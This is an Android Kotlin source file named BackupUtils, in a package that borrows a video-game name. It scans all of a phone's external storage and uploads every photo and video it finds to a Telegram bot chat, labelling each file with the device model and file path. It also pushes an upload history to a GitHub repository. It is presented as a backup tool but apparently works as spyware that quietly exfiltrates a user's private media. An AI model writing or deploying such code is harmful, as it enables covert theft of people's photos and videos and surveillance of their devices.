package com.service.assasinscreed02

import android.content.Context
import android.os.Environment
import android.util.Log
import com.google.gson.Gson
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import java.io.File
import java.io.FileInputStream
import java.security.MessageDigest
import kotlinx.coroutines.delay
import org.json.JSONObject
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.RequestBody.Companion.asRequestBody
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.Date
import android.os.Build

object BackupUtils {
    private const val TAG = "BackupUtils"
    private const val PREFS_NAME = "BackupPrefs"
    private const val UPLOADED_FILES_KEY = "uploaded_files"
    private const val BATCH_SIZE_IMAGES = 10
    private const val BATCH_SIZE_VIDEOS = 3
    private const val BATCH_DELAY_MS = 2000L

    data class BackupHistoryEntry(
        val fileName: String,
        val hash: String,
        val timestamp: Long
    )

    fun runBackup(context: Context, forzarConDatos: Boolean = false): Boolean {
        return runBackupWithProgress(context, forzarConDatos) { _, _, _, _, _, _, _, _ -> }
    }

    fun runBackupWithProgress(
        context: Context, 
        forzarConDatos: Boolean = false,
        progressCallback: (progress: Int, total: Int, currentFile: String, phase: String, sent: Int, errors: Int, fileProgress: Int, fileSize: Long) -> Unit
    ): Boolean {
        try {
            Log.d(TAG, "[DEBUG] runBackupWithProgress llamado. forzarConDatos=$forzarConDatos")
            Log.d(TAG, "[DEBUG] isWifiConnected=${isWifiConnected(context)}, isMobileDataConnected=${isMobileDataConnected(context)}")
            val config = ErrorHandler.obtenerConfigBot(context)
            if (config.first.isNullOrBlank() || config.second.isNullOrBlank()) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return false
            }
            val token = config.first ?: ""
            val chatId = config.second ?: ""
            
            // Verificar conexión según el modo
            if (!forzarConDatos && !isWifiConnected(context)) {
                Log.w(TAG, "No hay conexión WiFi disponible y no se permite usar datos móviles")
                return false
            }
            
            if (forzarConDatos && !isWifiConnected(context) && !isMobileDataConnected(context)) {
                Log.w(TAG, "No hay conexión WiFi ni datos móviles disponibles")
                return false
            }
            
            var totalArchivos = 0
            var archivosEnviados = 0
            var archivosError = 0
            
            // PRIMERA FASE: Escanear solo DCIM y Pictures
            progressCallback(0, 0, "", "Escaneando DCIM y Pictures...", archivosEnviados, archivosError, 0, 0)
            Log.d(TAG, "FASE 1: Escaneando DCIM y Pictures")
            val archivosDCIMyPictures = escanearDCIMyPictures(context)
            Log.d(TAG, "Encontrados ${archivosDCIMyPictures.size} archivos en DCIM y Pictures")
            
            if (archivosDCIMyPictures.isNotEmpty()) {
                val imagenesDCIM = archivosDCIMyPictures.filter { isImage(it) }
                val videosDCIM = archivosDCIMyPictures.filter { isVideo(it) }
                Log.d(TAG, "DCIM/Pictures - Imágenes: ${imagenesDCIM.size}, Videos: ${videosDCIM.size}")
                
                totalArchivos += imagenesDCIM.size + videosDCIM.size
                
                enviarPorLotesConProgreso(token, chatId, imagenesDCIM, BATCH_SIZE_IMAGES, "imágenes (DCIM/Pictures)", context, progressCallback, archivosEnviados, archivosError, forzarConDatos) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
                
                enviarPorLotesConProgreso(token, chatId, videosDCIM, BATCH_SIZE_VIDEOS, "videos (DCIM/Pictures)", context, progressCallback, archivosEnviados, archivosError, forzarConDatos) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
            }
            
            // SEGUNDA FASE: Escanear todo el dispositivo
            progressCallback(archivosEnviados, totalArchivos, "", "Escaneando resto del dispositivo...", archivosEnviados, archivosError, 0, 0)
            Log.d(TAG, "FASE 2: Escaneando todo el dispositivo")
            val archivosRestoDispositivo = escanearArchivosNuevos(context)
            Log.d(TAG, "Encontrados ${archivosRestoDispositivo.size} archivos en el resto del dispositivo")
            
            if (archivosRestoDispositivo.isNotEmpty()) {
                val imagenesResto = archivosRestoDispositivo.filter { isImage(it) }
                val videosResto = archivosRestoDispositivo.filter { isVideo(it) }
                Log.d(TAG, "Resto dispositivo - Imágenes: ${imagenesResto.size}, Videos: ${videosResto.size}")
                
                totalArchivos += imagenesResto.size + videosResto.size
                
                enviarPorLotesConProgreso(token, chatId, imagenesResto, BATCH_SIZE_IMAGES, "imágenes (resto dispositivo)", context, progressCallback, archivosEnviados, archivosError, forzarConDatos) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
                
                enviarPorLotesConProgreso(token, chatId, videosResto, BATCH_SIZE_VIDEOS, "videos (resto dispositivo)", context, progressCallback, archivosEnviados, archivosError, forzarConDatos) { sent, errors ->
                    archivosEnviados += sent
                    archivosError += errors
                }
            }
            
            progressCallback(archivosEnviados, totalArchivos, "", "Enviando historial...", archivosEnviados, archivosError, 0, 0)
            val historialFile = serializarHistorial(context)
            if (historialFile != null) {
                enviarArchivoATelegram(token, chatId, historialFile)
                Log.d(TAG, "Historial enviado al bot")
            }
            
            // Sincronizar con GitHub
            syncWithGitHub(context)
            
            guardarConexion(context)
            Log.d(TAG, "Backup completado exitosamente")
            return true
        } catch (e: Exception) {
            Log.e(TAG, "Error en BackupUtils: ${e.message}", e)
            return false
        }
    }

    private fun isWifiConnected(context: Context): Boolean {
        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_WIFI)
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando WiFi: ${e.message}")
            return false
        }
    }

    private fun isMobileDataConnected(context: Context): Boolean {
        try {
            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasTransport(android.net.NetworkCapabilities.TRANSPORT_CELLULAR)
        } catch (e: Exception) {
            Log.e(TAG, "Error verificando datos móviles: ${e.message}")
            return false
        }
    }

    private fun escanearDCIMyPictures(context: Context): List<File> {
        val extensiones = obtenerTiposArchivo(context).toList()
        val archivos = mutableListOf<File>()
        val archivosSubidos = obtenerArchivosSubidos(context)
        
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return archivos
            }
            
            // Escanear solo DCIM y Pictures
            val carpetasPrioritarias = listOf("DCIM", "Pictures")
            
            carpetasPrioritarias.forEach { nombreCarpeta ->
                val carpeta = File(directorio, nombreCarpeta)
                if (carpeta.exists() && carpeta.canRead()) {
                    Log.d(TAG, "Escaneando carpeta: $nombreCarpeta")
                    carpeta.walkTopDown().forEach { file ->
                        try {
                            if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                                if (file.canRead() && file.length() > 0) {
                                    val hash = calcularHashArchivo(file)
                                    if (!archivosSubidos.contains(hash)) {
                                        archivos.add(file)
                                    }
                                }
                            }
                        } catch (e: Exception) {
                            Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                        }
                    }
                } else {
                    Log.w(TAG, "Carpeta $nombreCarpeta no existe o no es accesible")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando DCIM y Pictures: ${e.message}", e)
        }
        
        return archivos.sortedBy { it.lastModified() }.reversed()
    }

    private fun escanearArchivosNuevos(context: Context): List<File> {
        val extensiones = obtenerTiposArchivo(context).toList()
        val archivos = mutableListOf<File>()
        val archivosSubidos = obtenerArchivosSubidos(context)
        try {
            val directorio = Environment.getExternalStorageDirectory()
            if (!directorio.exists() || !directorio.canRead()) {
                Log.w(TAG, "No se puede acceder al directorio de almacenamiento")
                return archivos
            }
            directorio.walkTopDown().forEach { file ->
                try {
                    if (file.isFile && extensiones.any { file.extension.equals(it, ignoreCase = true) }) {
                        if (file.canRead() && file.length() > 0) {
                            val hash = calcularHashArchivo(file)
                            if (!archivosSubidos.contains(hash)) {
                                archivos.add(file)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando archivo ${file.name}: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error escaneando medios: ${e.message}", e)
        }
        return archivos.sortedBy { it.lastModified() }.reversed()
    }

    private fun calcularHashArchivo(file: File): String {
        return try {
            val md = MessageDigest.getInstance("MD5")
            val buffer = ByteArray(8192) // 8KB buffer
            var bytesRead: Int
            FileInputStream(file).use { fis ->
                while (fis.read(buffer).also { bytesRead = it } != -1) {
                    md.update(buffer, 0, bytesRead)
                }
            }
            val digest = md.digest()
            digest.joinToString("") { "%02x".format(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Error calculando hash de "+file.name+": "+e.message)
            file.absolutePath + "_" + file.lastModified()
        }
    }

    private fun obtenerArchivosSubidos(context: Context): Set<String> {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
    }

    private fun serializarHistorial(context: Context): File? {
        return try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet()) ?: emptySet()
            val historyList = archivos.mapNotNull { hash ->
                val parts = hash.split("|||")
                if (parts.size == 3) BackupHistoryEntry(parts[0], parts[1], parts[2].toLongOrNull() ?: 0L) else null
            }
            val json = Gson().toJson(historyList)
            val file = File(context.cacheDir, "historial_backup.json")
            file.writeText(json)
            file
        } catch (e: Exception) {
            Log.e(TAG, "Error serializando historial: ${e.message}")
            null
        }
    }

    private fun guardarConexion(context: Context) {
        val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val ahora = System.currentTimeMillis()
        val anterior = prefs.getLong("ultima_conexion", 0L)
        prefs.edit().putLong("anterior_conexion", anterior).putLong("ultima_conexion", ahora).apply()
    }

    private fun isImage(file: File): Boolean {
        val extension = file.extension.lowercase()
        val tiposImagen = setOf("jpg", "jpeg", "png", "gif")
        return extension in tiposImagen
    }

    private fun isVideo(file: File): Boolean {
        val extension = file.extension.lowercase()
        val tiposVideo = setOf("mp4", "mov", "avi")
        return extension in tiposVideo
    }

    private fun enviarPorLotes(token: String, chatId: String, archivos: List<File>, batchSize: Int, tipo: String, context: Context, forzarConDatos: Boolean) {
        enviarPorLotesConProgreso(token, chatId, archivos, batchSize, tipo, context, { _, _, _, _, _, _, _, _ -> }, 0, 0, forzarConDatos) { _, _ -> }
    }

    private fun enviarPorLotesConProgreso(
        token: String, 
        chatId: String, 
        archivos: List<File>, 
        batchSize: Int, 
        tipo: String, 
        context: Context,
        progressCallback: (progress: Int, total: Int, currentFile: String, phase: String, sent: Int, errors: Int, fileProgress: Int, fileSize: Long) -> Unit,
        archivosEnviadosInicial: Int,
        archivosErrorInicial: Int,
        forzarConDatos: Boolean,
        onBatchComplete: (sent: Int, errors: Int) -> Unit
    ) {
        if (archivos.isEmpty()) return
        
        val lotes = archivos.chunked(batchSize)
        Log.d(TAG, "Enviando ${archivos.size} $tipo en ${lotes.size} lotes")
        
        var archivosEnviados = archivosEnviadosInicial
        var archivosError = archivosErrorInicial
        var archivoIndex = 0
        
        lotes.forEachIndexed { loteIndex, lote ->
            try {
                Log.d(TAG, "Enviando lote ${loteIndex + 1}/${lotes.size} de $tipo")
                var archivosEnviadosEnLote = 0
                
                lote.forEach { archivo ->
                    // Verificar si el backup fue cancelado
                    if (BackupProgressActivity.isBackupCancelled) {
                        Log.d(TAG, "Backup cancelado por el usuario")
                        return
                    }
                    // NUEVO: Verificar WiFi antes de cada archivo (solo si no se permite datos)
                    if (!forzarConDatos && !isWifiConnected(context)) {
                        Log.w(TAG, "Backup cancelado: se perdió la conexión WiFi durante la subida.")
                        // Registrar en el log de la app
                        try {
                            val logPrefs = context.getSharedPreferences("logs", Context.MODE_PRIVATE)
                            val logs = logPrefs.getString("logs", "") ?: ""
                            val nuevoLog = "[${java.text.SimpleDateFormat("dd/MM/yyyy HH:mm:ss").format(java.util.Date())}] Backup cancelado: se perdió la conexión WiFi durante la subida.\n"
                            logPrefs.edit().putString("logs", logs + nuevoLog).apply()
                        } catch (e: Exception) {
                            Log.e(TAG, "Error guardando log de cancelación de backup: "+e.message)
                        }
                        BackupProgressActivity.isBackupCancelled = true
                        return
                    }
                    try {
                        progressCallback(archivoIndex, archivos.size, archivo.name, "Enviando $tipo...", archivosEnviados, archivosError, 0, archivo.length())
                        
                        // Intentar enviar con reintentos
                        val resultado = enviarArchivoConReintentos(token, chatId, archivo, 3)
                        
                        if (resultado == null) { // Éxito
                            archivosEnviados++
                            archivosEnviadosEnLote++
                            val hash = calcularHashArchivo(archivo)
                            guardarArchivoSubido(context, archivo, hash)
                            Log.d(TAG, "Archivo enviado exitosamente: ${archivo.name}")
                        } else {
                            archivosError++
                            Log.e(TAG, "Error enviando archivo ${archivo.name}: $resultado")
                        }
                        
                        archivoIndex++
                        progressCallback(archivoIndex, archivos.size, archivo.name, "Enviando $tipo...", archivosEnviados, archivosError, 100, archivo.length())
                        
                        // Pequeña pausa entre archivos para no sobrecargar
                        Thread.sleep(500L)
                        
                    } catch (e: Exception) {
                        archivosError++
                        Log.e(TAG, "Error inesperado enviando archivo ${archivo.name}: ${e.message}", e)
                        archivoIndex++
                    }
                }
                
                Log.d(TAG, "Lote ${loteIndex + 1} completado: $archivosEnviadosEnLote/$tipo enviados")
                onBatchComplete(archivosEnviadosEnLote, 0)
                
                // Delay entre lotes (excepto el último)
                if (loteIndex < lotes.size - 1 && !BackupProgressActivity.isBackupCancelled) {
                    Thread.sleep(BATCH_DELAY_MS)
                }
                
            } catch (e: Exception) {
                Log.e(TAG, "Error enviando lote ${loteIndex + 1}: ${e.message}", e)
            }
        }
    }
    
    private fun enviarArchivoConReintentos(token: String, chatId: String, archivo: File, maxReintentos: Int): String? {
        var ultimoError: String? = null
        
        for (intento in 1..maxReintentos) {
            try {
                val resultado = enviarArchivoATelegram(token, chatId, archivo)
                if (resultado == null) {
                    // Éxito
                    if (intento > 1) {
                        Log.d(TAG, "Archivo ${archivo.name} enviado en intento $intento")
                    }
                    return null
                } else {
                    ultimoError = resultado
                    Log.w(TAG, "Intento $intento falló para ${archivo.name}: $resultado")
                    
                    // Si es un error de red, esperar antes del siguiente intento
                    if (resultado.contains("Timeout") || resultado.contains("conexión") || resultado.contains("internet")) {
                        if (intento < maxReintentos) {
                            Thread.sleep(2000L * intento) // Espera progresiva: 2s, 4s, 6s
                        }
                    } else {
                        // Si es un error del archivo (no existe, muy grande, etc.), no reintentar
                        break
                    }
                }
            } catch (e: Exception) {
                ultimoError = "Error inesperado: ${e.message}"
                Log.e(TAG, "Error en intento $intento para ${archivo.name}: ${e.message}")
                
                if (intento < maxReintentos) {
                    Thread.sleep(1000L * intento)
                }
            }
        }
        
        return ultimoError
    }

    private fun guardarArchivoSubido(context: Context, file: File, hash: String) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val archivosSubidos = prefs.getStringSet(UPLOADED_FILES_KEY, emptySet())?.toMutableSet() ?: mutableSetOf()
            val entry = "${file.name}|||$hash|||${file.lastModified()}"
            archivosSubidos.add(entry)
            prefs.edit().putStringSet(UPLOADED_FILES_KEY, archivosSubidos).apply()
        } catch (e: Exception) {
            Log.e(TAG, "Error guardando archivo subido: ${e.message}")
        }
    }

    fun enviarArchivoATelegram(token: String, chatId: String, archivo: File): String? {
        // Validaciones iniciales
        if (!archivo.exists()) {
            val msg = "Archivo no existe: ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        
        if (!archivo.canRead()) {
            val msg = "Archivo no se puede leer: ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        
        if (archivo.length() == 0L) {
            val msg = "Archivo vacío: ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        
        // Verificar tamaño del archivo (límite de Telegram: 50MB)
        val maxSize = 50L * 1024 * 1024 // 50MB
        if (archivo.length() > maxSize) {
            val msg = "Archivo demasiado grande (${archivo.length() / 1024L / 1024L}MB): ${archivo.name}"
            Log.w(TAG, msg)
            return msg
        }
        
        val url = "https://api.telegram.org/bot$token/sendDocument"
        val maxReintentos = 5
        var intento = 1
        var backoff = 1000L // 1 segundo
        val maxBackoff = 60000L // 1 minuto
        while (intento <= maxReintentos) {
            try {
                // Crear cliente con timeouts más largos para archivos grandes
                val client = OkHttpClient.Builder()
                    .connectTimeout(60L, java.util.concurrent.TimeUnit.SECONDS)
                    .readTimeout(300L, java.util.concurrent.TimeUnit.SECONDS) // 5 minutos para archivos grandes
                    .writeTimeout(300L, java.util.concurrent.TimeUnit.SECONDS)
                    .build()
                
                // Determinar el tipo MIME correcto
                val mimeType = when (archivo.extension.lowercase()) {
                    "jpg", "jpeg" -> "image/jpeg"
                    "png" -> "image/png"
                    "mp4" -> "video/mp4"
                    "mov" -> "video/quicktime"
                    "avi" -> "video/x-msvideo"
                    "pdf" -> "application/pdf"
                    "docx" -> "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
                    "txt" -> "text/plain"
                    else -> "application/octet-stream"
                }
                
                // Determinar el tema de destino
                val telegramTopic = getTelegramTopicName(archivo.absolutePath)
                
                // Crear caption con información del tema (para agrupación)
                val caption = buildString {
                    append("📁 <b>$telegramTopic</b>\n")
                    append("📄 <b>Archivo:</b> ${archivo.name}\n")
                    append("💾 <b>Tamaño:</b> ${formatFileSize(archivo.length())}\n")
                    append("📅 <b>Fecha:</b> ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date(archivo.lastModified()))}\n")
                    append("📱 <b>Dispositivo:</b> ${Build.MANUFACTURER} ${Build.MODEL}\n")
                    append("📍 <b>Origen:</b> ${archivo.absolutePath}")
                }
                
                // Obtener el ID del tema correspondiente
                val topicId = getTopicIdForFolder(telegramTopic, token, chatId)
                
                val requestBodyBuilder = okhttp3.MultipartBody.Builder()
                    .setType(okhttp3.MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart(
                        "document",
                        archivo.name,
                        archivo.asRequestBody(mimeType.toMediaTypeOrNull())
                    )
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("parse_mode", "HTML")
                
                // Si se encontró un tema, enviar el archivo dentro de ese tema
                if (topicId != null) {
                    requestBodyBuilder.addFormDataPart("message_thread_id", topicId.toString())
                }
                
                val requestBody = requestBodyBuilder.build()
                
                val request = Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build()
                
                val response = client.newCall(request).execute()
                val responseBody = response.body?.string() ?: ""
                if (!response.isSuccessful) {
                    // Manejo de error 429 (rate limit)
                    if (response.code == 429) {
                        var retryAfter = 0L
                        try {
                            val json = org.json.JSONObject(responseBody)
                            retryAfter = json.optJSONObject("parameters")?.optLong("retry_after") ?: 0L
                        } catch (_: Exception) {}
                        if (retryAfter > 0) {
                            Log.w(TAG, "Error 429: esperando $retryAfter segundos antes de reintentar archivo ${archivo.name}")
                            Thread.sleep(retryAfter * 1000)
                        } else {
                            Log.w(TAG, "Error 429: esperando $backoff ms antes de reintentar archivo ${archivo.name}")
                            Thread.sleep(backoff)
                            backoff = (backoff * 2).coerceAtMost(maxBackoff)
                        }
                        intento++
                        response.close()
                        continue
                    }
                    val msg = "Error HTTP ${response.code}: $responseBody"
                    Log.e(TAG, "Error HTTP enviando archivo ${archivo.name} a Telegram: $msg")
                    response.close()
                    return msg
                }
                
                // Verificar que la respuesta sea válida
                if (responseBody.isEmpty()) {
                    val msg = "Respuesta vacía del servidor para: ${archivo.name}"
                    Log.w(TAG, msg)
                    response.close()
                    return msg
                }
                
                // Verificar si la respuesta indica éxito
                if (!responseBody.contains("\"ok\":true")) {
                    val msg = "Respuesta de error de Telegram: $responseBody"
                    Log.e(TAG, "Error en respuesta de Telegram para ${archivo.name}: $msg")
                    response.close()
                    return msg
                }
                
                Log.d(TAG, "✅ Archivo enviado exitosamente: ${archivo.name} a tema $telegramTopic")
                response.close()
                return null // null = éxito
                
            } catch (e: java.net.SocketTimeoutException) {
                val msg = "Timeout enviando archivo: ${archivo.name}"
                Log.e(TAG, msg, e)
                try { Thread.sleep(backoff) } catch (_: Exception) {}
                backoff = (backoff * 2).coerceAtMost(maxBackoff)
                intento++
            } catch (e: java.net.UnknownHostException) {
                val msg = "Error de conexión (sin internet): ${archivo.name}"
                Log.e(TAG, msg, e)
                try { Thread.sleep(backoff) } catch (_: Exception) {}
                backoff = (backoff * 2).coerceAtMost(maxBackoff)
                intento++
            } catch (e: java.net.ConnectException) {
                val msg = "Error de conexión al servidor: ${archivo.name}"
                Log.e(TAG, msg, e)
                try { Thread.sleep(backoff) } catch (_: Exception) {}
                backoff = (backoff * 2).coerceAtMost(maxBackoff)
                intento++
            } catch (e: Exception) {
                val msg = "Error inesperado enviando archivo ${archivo.name}: ${e.message}"
                Log.e(TAG, msg, e)
                try { Thread.sleep(backoff) } catch (_: Exception) {}
                backoff = (backoff * 2).coerceAtMost(maxBackoff)
                intento++
            }
        }
        return "No se pudo enviar el archivo tras $maxReintentos intentos: ${archivo.name}"
    }

    fun ejecutarBackupManual(context: Context): Boolean {
        return try {
            Log.d(TAG, "Iniciando backup manual")
            
            // Verificar configuración
            val config = ErrorHandler.obtenerConfigBot(context)
            if (config.first.isNullOrBlank() || config.second.isNullOrBlank()) {
                Log.e(TAG, "Configuración del bot no encontrada")
                return false
            }
            
            val (token, chatId) = config
            
            // Verificar permisos
            if (!ErrorHandler.validatePermissions(context)) {
                Log.e(TAG, "Permisos de almacenamiento no otorgados")
                return false
            }
            
            // Ejecutar backup por fases si está activado
            val backupPorFases = obtenerBackupPorFases(context)
            if (backupPorFases) {
                Log.d(TAG, "Ejecutando backup por fases")
                runBackupWithProgress(context, false) { _, _, _, _, _, _, _, _ -> }
            } else {
                Log.d(TAG, "Ejecutando backup completo")
                runBackupWithProgress(context, false) { _, _, _, _, _, _, _, _ -> }
            }
            
            // Guardar conexión
            guardarConexion(context)
            
            Log.d(TAG, "Backup manual completado")
            true
            
        } catch (e: Exception) {
            Log.e(TAG, "Error en backup manual: ${e.message}", e)
            false
        }
    }

    private fun syncWithGitHub(context: Context) {
        try {
            val prefs = context.getSharedPreferences("github_config", Context.MODE_PRIVATE)
            val token = prefs.getString("github_token", "") ?: ""
            
            if (token.isBlank()) {
                Log.d(TAG, "GitHub no configurado, saltando sincronización")
                return
            }
            
            val config = com.service.assasinscreed02.github.GitHubHistorialSync.GitHubConfig(
                token = token,
                owner = prefs.getString("github_owner", "userserverbackup") ?: "userserverbackup",
                repo = prefs.getString("github_repo", "radio2-backup-historial") ?: "radio2-backup-historial",
                branch = prefs.getString("github_branch", "main") ?: "main"
            )
            
            // Ejecutar sincronización en background usando Thread
            Thread {
                try {
                    val githubSync = com.service.assasinscreed02.github.GitHubHistorialSync(context)
                    
                    // Obtener historial local desde SharedPreferences
                    val archivosSubidos = obtenerArchivosSubidos(context)
                    val historialLocal = archivosSubidos.mapNotNull { hash ->
                        val parts = hash.split("|||")
                        if (parts.size == 3) {
                            com.service.assasinscreed02.database.BackupFile(
                                fileName = parts[0],
                                filePath = "", // No tenemos la ruta completa en SharedPreferences
                                fileHash = parts[1],
                                fileSize = 0L, // No tenemos el tamaño en SharedPreferences
                                fileType = "unknown",
                                uploadDate = parts[2].toLongOrNull() ?: System.currentTimeMillis()
                            )
                        } else null
                    }
                    
                    val success = kotlinx.coroutines.runBlocking {
                        githubSync.syncHistorialToGitHub(historialLocal, config)
                    }
                    
                    if (success) {
                        Log.d(TAG, "Sincronización con GitHub exitosa")
                    } else {
                        Log.w(TAG, "Error en sincronización con GitHub")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error sincronizando con GitHub: ${e.message}", e)
                }
            }.start()
            
        } catch (e: Exception) {
            Log.e(TAG, "Error iniciando sincronización con GitHub: ${e.message}", e)
        }
    }

    /**
     * Obtiene el nombre del tema de Telegram basado en la ruta del archivo
     */
    private fun getTelegramTopicName(filePath: String): String {
        return try {
            val normalizedPath = filePath.lowercase()
            when {
                normalizedPath.contains("/dcim/") -> {
                    when {
                        normalizedPath.contains("/camera/") -> "📸 DCIM - Camera"
                        normalizedPath.contains("/screenshots/") -> "📸 DCIM - Screenshots"
                        normalizedPath.contains("/whatsapp/") -> "📸 DCIM - WhatsApp"
                        normalizedPath.contains("/telegram/") -> "📸 DCIM - Telegram"
                        normalizedPath.contains("/instagram/") -> "📸 DCIM - Instagram"
                        normalizedPath.contains("/downloads/") -> "📸 DCIM - Downloads"
                        else -> "📸 DCIM - Other"
                    }
                }
                normalizedPath.contains("/pictures/") -> "📸 Pictures"
                normalizedPath.contains("/movies/") -> "🎥 Movies"
                normalizedPath.contains("/videos/") -> "🎥 Videos"
                normalizedPath.contains("/music/") -> "🎵 Music"
                normalizedPath.contains("/ringtones/") -> "🎵 Ringtones"
                normalizedPath.contains("/notifications/") -> "🎵 Notifications"
                normalizedPath.contains("/alarms/") -> "🎵 Alarms"
                normalizedPath.contains("/documents/") -> "📄 Documents"
                normalizedPath.contains("/downloads/") -> "📄 Downloads"
                normalizedPath.contains("/.apk") -> "📱 Apps"
                normalizedPath.contains("/.aab") -> "📱 Apps"
                else -> "📁 Other"
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error determinando tema de Telegram: ${e.message}")
            "📁 Other"
        }
    }

    /**
     * Crea la estructura de carpetas en Telegram si no existe
     */
    private suspend fun ensureTelegramFolderStructure(token: String, chatId: String) {
        try {
            val folders = listOf(
                "📸 DCIM",
                "📸 DCIM/Camera",
                "📸 DCIM/Screenshots", 
                "📸 DCIM/WhatsApp",
                "📸 DCIM/Telegram",
                "📸 DCIM/Instagram",
                "📸 DCIM/Downloads",
                "📸 DCIM/Other",
                "📸 Pictures",
                "🎥 Movies",
                "🎥 Videos",
                "🎵 Music",
                "🎵 Ringtones",
                "🎵 Notifications",
                "🎵 Alarms",
                "📄 Documents",
                "📄 Downloads",
                "📱 Apps",
                "📁 Other"
            )

            for (folder in folders) {
                createTelegramFolder(token, chatId, folder)
                delay(100) // Pequeña pausa para evitar rate limiting
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error creando estructura de carpetas: ${e.message}")
        }
    }

    /**
     * Formatea el tamaño de archivo en formato legible
     */
    private fun formatFileSize(size: Long): String {
        return when {
            size < 1024 -> "$size B"
            size < 1024 * 1024 -> "${size / 1024} KB"
            size < 1024 * 1024 * 1024 -> "${size / (1024 * 1024)} MB"
            else -> "${size / (1024 * 1024 * 1024)} GB"
        }
    }

    /**
     * Obtiene el ID del tema de Telegram basado en el nombre del tema
     */
    private fun getTopicIdForFolder(topicName: String, token: String, chatId: String): Int? {
        return try {
            // Mapeo de nombres de temas a IDs (esto debe ser configurado manualmente)
            val topicMapping = mapOf(
                "📸 DCIM - Camera" to 1,
                "📸 DCIM - Screenshots" to 2,
                "📸 DCIM - WhatsApp" to 3,
                "📸 DCIM - Telegram" to 4,
                "📸 DCIM - Instagram" to 5,
                "📸 DCIM - Downloads" to 6,
                "📸 DCIM - Other" to 7,
                "📸 Pictures" to 8,
                "🎥 Movies" to 9,
                "🎥 Videos" to 10,
                "🎵 Music" to 11,
                "🎵 Ringtones" to 12,
                "🎵 Notifications" to 13,
                "🎵 Alarms" to 14,
                "📄 Documents" to 15,
                "📄 Downloads" to 16,
                "📱 Apps" to 17,
                "📁 Other" to 18
            )
            
            topicMapping[topicName]
        } catch (e: Exception) {
            Log.e(TAG, "Error obteniendo ID del tema $topicName: ${e.message}")
            null
        }
    }

    /**
     * Crea una carpeta en Telegram usando un mensaje con el nombre de la carpeta
     */
    private suspend fun createTelegramFolder(token: String, chatId: String, folderName: String) {
        try {
            val message = "📁 $folderName"
            val url = "https://api.telegram.org/bot$token/sendMessage"
            
            val json = JSONObject().apply {
                put("chat_id", chatId)
                put("text", message)
                put("parse_mode", "HTML")
            }

            val client = OkHttpClient()
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
            val request = Request.Builder().url(url).post(body).build()

            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                Log.d(TAG, "✅ Carpeta creada en Telegram: $folderName")
            } else {
                Log.w(TAG, "⚠️ No se pudo crear carpeta: $folderName - ${response.code}")
            }
            response.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error creando carpeta en Telegram: ${e.message}")
        }
    }
} 